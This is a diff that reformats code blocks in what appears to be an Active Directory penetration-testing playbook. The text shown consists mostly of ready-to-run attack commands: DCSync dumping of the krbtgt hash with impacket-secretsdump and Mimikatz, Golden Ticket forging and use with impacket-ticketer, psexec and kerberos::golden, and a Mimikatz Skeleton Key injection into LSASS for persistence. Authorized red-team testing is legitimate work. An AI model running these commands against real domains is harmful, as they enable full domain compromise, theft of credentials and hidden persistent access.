@@ -220,7 +220,11 @@ impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' -just-dc
 # DCSync specific user
 impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' \
   -just-dc-user krbtgt
+```
 
+In the Mimikatz console on Windows; omit the displayed prompts:
+
+```text
 # With Mimikatz (Windows)
 mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
 ```
@@ -233,10 +237,13 @@ impacket-ticketer -nthash <krbtgt_nthash> -domain-sid S-1-5-21-... \
   -domain corp.local administrator
 export KRB5CCNAME=administrator.ccache
 impacket-psexec 'corp.local/administrator@dc01.corp.local' -k -no-pass
+```
 
+In the Mimikatz console on Windows; enter the command on one line and omit the displayed prompt:
+
+```text
 # With Mimikatz
-mimikatz# kerberos::golden /user:administrator /domain:corp.local \
-  /sid:S-1-5-21-... /krbtgt:<hash> /ptt
+mimikatz# kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
 ```
 
 ### Silver Ticket
@@ -252,7 +259,9 @@ impacket-mssqlclient 'corp.local/administrator@sqlserver.corp.local' -k -no-pass
 
 ## Phase 5 — Persistence Demonstration
 
-```bash
+In the Mimikatz console on Windows; omit the displayed prompts:
+
+```text
 # Skeleton Key (inject into LSASS — authorized testing only)
 mimikatz# privilege::debug
 mimikatz# misc::skeleton
